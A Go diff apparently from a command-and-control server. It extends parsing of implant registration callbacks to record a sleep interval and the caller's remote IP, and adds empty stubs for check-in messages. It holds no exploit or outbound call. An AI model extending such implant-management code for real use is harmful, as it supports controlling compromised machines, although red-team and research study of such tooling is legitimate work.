@@ -6,9 +6,10 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
+	"net/http"
 )
 
-func ParseCallback(d io.ReadCloser) int {
+func ParseCallback(d io.ReadCloser, req *http.Request) int {
 	r := base64.NewDecoder(base64.StdEncoding, d)
 	var messageType uint16
 
@@ -21,14 +22,16 @@ func ParseCallback(d io.ReadCloser) int {
 
 
 	if messageType == REG {
-		ParseAndReg(r)
+		ParseAndReg(r, req)
 		return REG
+	} else if messageType == CHK {
+		
 	}
 
 	return NIL
 }
 
-func ParseAndReg(r io.Reader) {
+func ParseAndReg(r io.Reader, req *http.Request) {
 	println("registration request")
 
 	i := new(ImplantMetadata)
@@ -38,6 +41,7 @@ func ParseAndReg(r io.Reader) {
 	binary.Read(r, binary.BigEndian, &i.SessionID)
 	binary.Read(r, binary.BigEndian, &i.IP)
 	binary.Read(r, binary.BigEndian, &i.Port)
+	binary.Read(r, binary.BigEndian, &i.Sleep)
 	binary.Read(r, binary.BigEndian, &arch)
 	binary.Read(r, binary.BigEndian, &dataLen)
 	
@@ -57,5 +61,11 @@ func ParseAndReg(r io.Reader) {
 
 	imp := ImplantNew(fmt.Sprintf("%d", i.SessionID), "123")
 	imp.ImplantSetMetadata(i)
+	imp.ImplantSetRemoteIP(req.RemoteAddr)
 	imp.ImplantAddImplant()
+}
+
+
+func ParseCheck(r io.Reader, req *http.Request) {
+
 }
